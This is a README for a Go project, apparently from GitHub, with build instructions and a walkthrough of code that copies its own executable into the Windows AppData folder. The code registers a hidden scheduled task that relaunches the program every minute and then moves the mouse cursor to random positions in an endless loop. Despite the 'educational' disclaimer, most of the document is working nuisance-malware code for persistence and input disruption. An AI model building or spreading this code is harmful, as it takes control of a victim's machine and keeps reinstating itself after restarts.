

# Autonomous System Interaction Demo

*A Go-based exploration of persistence and dynamic system interaction* 

---

## Getting Started

### 1. Install Go

Download and install Go from the official website:
👉 [https://go.dev/dl](https://go.dev/dl)

After installation, verify by running:

```bash
go version
```

---

### 2. Clone the Repository

```bash
git clone https://github.com/3582-490/MovingMouse.git
cd MovingMouse
```

---

### 3. Build the Project for Windows

To compile the project as a Windows executable:

```bash
go build -o app.exe main.go
```

This will generate a file named **`app.exe`** in the current directory 

---

## Overview

This project is a lightweight **Go-based demonstration** that showcases techniques related to:

1. **File relocation into user data directories** for persistence 
2. **Automated relaunch scheduling** through the Windows task planner 
3. **Continuous dynamic interface activity** generated programmatically 

The implementation is purely for **educational and research purposes**, highlighting how persistence mechanisms and interactive system behaviors can be combined in a single application 

---

## Code Walkthrough

### 1 Relocating the Executable 

```go
exePath, _ := os.Executable()
appData := os.Getenv("APPDATA")
outPath := filepath.Join(appData, filepath.Base(exePath))

input, _ := os.ReadFile(exePath)
os.WriteFile(outPath, input, 0644)
```

* Detects its own binary location 
* Creates a duplicate inside the **AppData** directory, a common location for application support files 

---

### 2 Establishing Scheduled Relaunch 

```go
taskName := filepath.Base(exePath)
taskName = taskName[:len(taskName)-len(filepath.Ext(taskName))]
cmd := exec.Command("schtasks.exe", "/create", "/f", "/sc", "minute", "/mo", "1", "/tn", taskName, "/tr", outPath)
cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
cmd.Run()
```

* Registers a scheduled task via Windows’ built-in **Task Scheduler** 
* Configured to trigger regularly, ensuring **persistence even after system restarts** 

---

### 3 Linking with System Libraries 

```go
user32 := windows.NewLazyDLL("user32.dll")
setCursorPos := user32.NewProc("SetCursorPos")
getSystemMetrics := user32.NewProc("GetSystemMetrics")

screenWidth, _, _ := getSystemMetrics.Call(0)
screenHeight, _, _ := getSystemMetrics.Call(1)
```

* Dynamically loads functions from **user32.dll**.
* Retrieves screen dimensions to define boundaries for interactive behavior 

---

### 4 Generating Continuous Activity 

```go
rand.Seed(time.Now().UnixNano())
for {
    x := rand.Intn(int(screenWidth))
    y := rand.Intn(int(screenHeight))
    setCursorPos.Call(uintptr(x), uintptr(y))
    time.Sleep(100 * time.Millisecond)
}
```

* Seeds a random generator with the current timestamp 
* Continuously produces new coordinate pairs 
* Sends instructions to reposition a system control element, creating **constant dynamic activity** on the interface 

---

## Disclaimer  

This repository is provided **strictly for research and educational demonstration** 
I (3582-490) am **not responsible** for any misuse of this project 
Running or modifying this program is entirely at the user’s own risk.
